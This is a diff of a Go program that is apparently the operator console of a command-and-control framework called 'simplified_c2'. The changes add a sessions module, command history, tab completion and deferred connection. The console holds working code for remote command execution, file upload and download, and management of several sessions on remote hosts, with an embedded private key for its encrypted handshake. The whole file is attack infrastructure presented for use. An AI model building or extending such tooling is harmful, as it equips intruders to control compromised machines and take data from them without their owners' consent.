@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/gob"
@@ -14,7 +13,11 @@ import (
 	"strings"
 	"syscall"
 
+	"github.com/peterh/liner"
+
 	"github.com/simplified_c2/core/crypto"
+	"github.com/simplified_c2/module"
+	"github.com/simplified_c2/modules/sessions"
 	"github.com/simplified_c2/shell"
 
 	_ "embed"
@@ -39,23 +42,28 @@ type MessageHeader struct {
 }
 
 type SecureShell struct {
-	conn        net.Conn
-	passphrase  []byte // Fallback passphrase (not used with session key)
-	sessionID   string
-	sessionKey  []byte // Session-specific AES key
-	sessionIV   []byte // Session-specific AES IV
-	interactive bool
-	shell       *shell.Shell
+	conn         net.Conn
+	passphrase   []byte // Fallback passphrase (not used with session key)
+	sessionID    string
+	sessionKey   []byte // Session-specific AES key
+	sessionIV    []byte // Session-specific AES IV
+	interactive  bool
+	shell        *shell.Shell
+	moduleSystem *module.ModuleSystem // Reutilizar moduleSystem
 }
 
 //go:embed private_key.pem
 var privateKeyPEM []byte // RSA private key for decrypting session key/IV
 
 func NewSecureShell(passphrase string, interactive bool) *SecureShell {
+	// Inicializar moduleSystem
+	moduleSystem := module.NewModuleSystem()
+	registerBuiltinModules(moduleSystem)
 	return &SecureShell{
-		passphrase:  []byte(passphrase),
-		interactive: interactive,
-		shell:       shell.NewShell(),
+		passphrase:   []byte(passphrase),
+		interactive:  interactive,
+		shell:        shell.NewShell(),
+		moduleSystem: moduleSystem,
 	}
 }
 
@@ -80,15 +88,22 @@ func (s *SecureShell) Connect(host string, port int, useTLS bool) error {
 	}
 	fmt.Printf("Connected to %s\n", addr)
 
-	if err := s.performHandshake(); err != nil {
+	sessionModule, err := s.moduleSystem.Manager.LoadModule("sessions")
+	if err != nil {
+		s.conn.Close()
+		return fmt.Errorf("failed to load sessions module: %v", err)
+	}
+
+	if err := s.performHandshake(host, port, string(s.passphrase), useTLS, sessionModule); err != nil {
 		s.conn.Close()
 		return fmt.Errorf("handshake failed: %v", err)
 	}
+
 	fmt.Println("Secure connection established")
 	return nil
 }
 
-func (s *SecureShell) performHandshake() error {
+func (s *SecureShell) performHandshake(host string, port int, passphrase string, useTLS bool, sessionModule module.ModuleInterface) error {
 	decoder := gob.NewDecoder(s.conn)
 	encoder := gob.NewEncoder(s.conn)
 
@@ -149,6 +164,20 @@ func (s *SecureShell) performHandshake() error {
 	if err := encoder.Encode(response); err != nil {
 		return fmt.Errorf("failed to send handshake response: %v", err)
 	}
+
+	// Register session in the sessions module
+	_, err = sessionModule.ExecuteCommand("register", []string{host, fmt.Sprintf("%d", port), passphrase, sessionID, fmt.Sprintf("%t", useTLS)})
+	if err != nil {
+		return fmt.Errorf("failed to register session: %v", err)
+	}
+	fmt.Printf("Session %s registered successfully\n", sessionID)
+
+	// Connect session to mark as active
+	_, err = sessionModule.ExecuteCommand("connect", []string{"new", host, fmt.Sprintf("%d", port), passphrase, fmt.Sprintf("%t", useTLS)})
+	if err != nil {
+		return fmt.Errorf("failed to connect session: %v", err)
+	}
+	fmt.Printf("Session %s connected successfully\n", sessionID)
 
 	return nil
 }
@@ -214,29 +243,76 @@ func (s *SecureShell) RunInteractive() error {
 	go func() {
 		<-sigChan
 		fmt.Println("\nExiting...")
-		s.conn.Close()
+		if s.conn != nil {
+			s.conn.Close()
+		}
 		os.Exit(0)
 	}()
+
+	// Initialize liner for interactive TTY
+	line := liner.NewLiner()
+	defer line.Close()
+
+	// Enable history
+	line.SetCtrlCAborts(true)
+	historyFile := os.Getenv("HOME") + "/.c2_history"
+	if f, err := os.Open(historyFile); err == nil {
+		line.ReadHistory(f)
+		f.Close()
+	}
+
+	// Set completer for commands
+	line.SetCompleter(func(line string) (c []string) {
+		commands := []string{
+			"upload ", "download ", "cd ", "pwd", "/sessions ",
+			"/sessions connect ", "/sessions disconnect", "/sessions listsessions",
+			"/sessions changesession ", "/sessions execute ", "/sessions status",
+			"exit",
+		}
+		for _, cmd := range commands {
+			if strings.HasPrefix(cmd, strings.ToLower(line)) {
+				c = append(c, cmd)
+			}
+		}
+		return
+	})
+
 	fmt.Println("Secure shell ready. Type 'exit' to quit.")
 	fmt.Println("Special commands:")
 	fmt.Println("  upload <local_file> <remote_file> - Upload a file")
 	fmt.Println("  download <remote_file> <local_file> - Download a file")
 	fmt.Println("  cd <directory> - Change directory")
 	fmt.Println("  pwd - Print working directory")
+	fmt.Println("  /sessions [subcommand] - Manage sessions (e.g., connect, disconnect, listsessions)")
 
 	for {
-		fmt.Print("> ")
-		scanner := bufio.NewScanner(os.Stdin)
-		if !scanner.Scan() {
+		command, err := line.Prompt("> ")
+		if err == liner.ErrPromptAborted || err == io.EOF {
 			break
 		}
-		command := strings.TrimSpace(scanner.Text())
+		if err != nil {
+			fmt.Printf("Error reading input: %v\n", err)
+			break
+		}
 
+		command = strings.TrimSpace(command)
+		if command == "" {
+			continue
+		}
+
+		// Append to history
+		line.AppendHistory(command)
+
+		// Handle special commands
 		if len(command) > 7 && command[:7] == "upload " {
 			var localFile, remoteFile string
 			fmt.Sscanf(command[7:], "%s %s", &localFile, &remoteFile)
 			if localFile == "" || remoteFile == "" {
 				fmt.Println("Usage: upload <local_file> <remote_file>")
+				continue
+			}
+			if s.conn == nil {
+				fmt.Println("Error: no active connection")
 				continue
 			}
 			if err := s.uploadFile(localFile, remoteFile); err != nil {
@@ -253,6 +329,10 @@ func (s *SecureShell) RunInteractive() error {
 				fmt.Println("Usage: download <remote_file> <local_file>")
 				continue
 			}
+			if s.conn == nil {
+				fmt.Println("Error: no active connection")
+				continue
+			}
 			if err := s.downloadFile(remoteFile, localFile); err != nil {
 				fmt.Printf("Download failed: %v\n", err)
 			} else {
@@ -260,12 +340,70 @@ func (s *SecureShell) RunInteractive() error {
 			}
 			continue
 		}
+		if len(command) >= 9 && command[:9] == "/sessions" {
+			sessionModule, err := s.moduleSystem.Manager.LoadModule("sessions")
+			if err != nil {
+				fmt.Printf("Error loading sessions module: %v\n", err)
+				continue
+			}
 
+			// Parse subcomando e argumentos
+			parts := strings.Fields(command)
+			if len(parts) == 1 {
+				// /sessions sem subcomando = listsessions
+				result, err := sessionModule.ExecuteCommand("listsessions", []string{})
+				if err != nil {
+					fmt.Printf("Error executing listsessions: %v\n", err)
+					continue
+				}
+				for _, line := range result.([]string) {
+					fmt.Println("session:", line)
+				}
+			} else {
+				// /sessions <subcomando> <args>
+				subcommand := parts[1]
+				args := parts[2:]
+				result, err := sessionModule.ExecuteCommand(subcommand, args)
+				if err != nil {
+					fmt.Printf("Error executing %s: %v\n", subcommand, err)
+					continue
+				}
+				switch subcommand {
+				case "listsessions":
+					for _, line := range result.([]string) {
+						fmt.Println("session:", line)
+					}
+				case "connect", "changesession", "execute", "register":
+					fmt.Println(result.(string))
+				case "disconnect":
+					fmt.Println(result.(string))
+					// Atualizar conexão do SecureShell
+					if len(args) > 0 {
+						s.sessionID = args[0]
+						s.conn = nil // Conexão foi fechada
+					}
+				case "status":
+					for key, value := range result.(map[string]interface{}) {
+						fmt.Printf("%s: %v\n", key, value)
+					}
+				default:
+					fmt.Printf("Unknown subcommand: %s\n", subcommand)
+				}
+			}
+			continue
+		}
+
+		// Send command to server
+		if s.conn == nil {
+			fmt.Println("Error: no active connection. Use '/sessions connect' to establish a connection")
+			continue
+		}
 		if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
 			fmt.Printf("Error sending command: %v\n", err)
 			break
 		}
 
+		// Receive response
 		msgType, payload, err := s.receiveMessage()
 		if err != nil {
 			fmt.Printf("Error receiving response: %v\n", err)
@@ -279,6 +417,13 @@ func (s *SecureShell) RunInteractive() error {
 			fmt.Printf("Unexpected message type: %d\n", msgType)
 		}
 	}
+
+	// Save history
+	if f, err := os.Create(historyFile); err == nil {
+		line.WriteHistory(f)
+		f.Close()
+	}
+
 	return nil
 }
 
@@ -325,6 +470,9 @@ func (s *SecureShell) downloadFile(remotePath, localPath string) error {
 }
 
 func (s *SecureShell) ExecuteCommand(command string) (string, error) {
+	if s.conn == nil {
+		return "", fmt.Errorf("no active connection")
+	}
 	if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
 		return "", err
 	}
@@ -349,7 +497,7 @@ func (s *SecureShell) Close() {
 }
 
 func main() {
-	host := flag.String("host", "127.0.0.1", "Host to connect to")
+	host := flag.String("host", "", "Host to connect to")
 	port := flag.Int("port", 8443, "Port to connect to")
 	passphrase := flag.String("passphrase", "default-passphrase", "Passphrase for encryption (fallback)")
 	useTLS := flag.Bool("tls", true, "Use TLS encryption")
@@ -359,12 +507,15 @@ func main() {
 
 	secureShell := NewSecureShell(*passphrase, *interactive)
 
-	err := secureShell.Connect(*host, *port, *useTLS)
-	if err != nil {
-		fmt.Printf("Connection failed: %v\n", err)
-		os.Exit(1)
+	// Só conectar se host for fornecido
+	if *host != "" && *interactive {
+		err := secureShell.Connect(*host, *port, *useTLS)
+		if err != nil {
+			fmt.Printf("Connection failed: %v\n", err)
+			os.Exit(1)
+		}
+		defer secureShell.Close()
 	}
-	defer secureShell.Close()
 
 	if *interactive {
 		if err := secureShell.RunInteractive(); err != nil {
@@ -372,6 +523,16 @@ func main() {
 			os.Exit(1)
 		}
 	} else if *command != "" {
+		if *host == "" {
+			fmt.Println("Error: host must be specified in non-interactive mode")
+			os.Exit(1)
+		}
+		err := secureShell.Connect(*host, *port, *useTLS)
+		if err != nil {
+			fmt.Printf("Connection failed: %v\n", err)
+			os.Exit(1)
+		}
+		defer secureShell.Close()
 		output, err := secureShell.ExecuteCommand(*command)
 		if err != nil {
 			fmt.Printf("Error: %v\n", err)
@@ -382,4 +543,11 @@ func main() {
 		fmt.Println("No command specified in non-interactive mode")
 		os.Exit(1)
 	}
+}
+
+func registerBuiltinModules(moduleSystem *module.ModuleSystem) {
+	sessionModule := sessions.NewModule()
+	moduleSystem.Registry.RegisterModule("sessions", func() module.ModuleInterface {
+		return sessionModule
+	})
 }
